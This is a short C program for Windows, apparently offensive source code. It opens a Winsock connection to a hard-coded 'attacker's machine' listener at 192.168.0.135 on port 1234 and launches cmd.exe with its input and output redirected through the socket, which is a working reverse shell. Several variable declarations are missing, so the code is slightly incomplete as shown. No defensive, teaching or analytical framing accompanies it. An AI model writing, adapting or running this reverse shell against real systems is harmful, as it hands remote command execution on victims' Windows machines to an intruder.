#include <winsock2.h>
#include <stdio.h>

int main(int argc, char* argv[])
{
  // listener ip, port on attacker's machine
  char *ip = "192.168.0.135";
  int port = 1234;

  // init socket lib (WSAStartup function initiates use of the Winsock DLL by a process)
  WSAStartup(MAKEWORD(2, 2), &wsaData);

  // create socket
  wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

  hax.sin_family = AF_INET;
  hax.sin_port = htons(port);
  hax.sin_addr.s_addr = inet_addr(ip);

  // connect to remote host
  WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

  memset(&sui, 0, sizeof(sui));
  sui.cb = sizeof(sui);
  sui.dwFlags = STARTF_USESTDHANDLES;
  sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) wSock;

  // start cmd.exe with redirected streams
  CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
  exit(0);
}

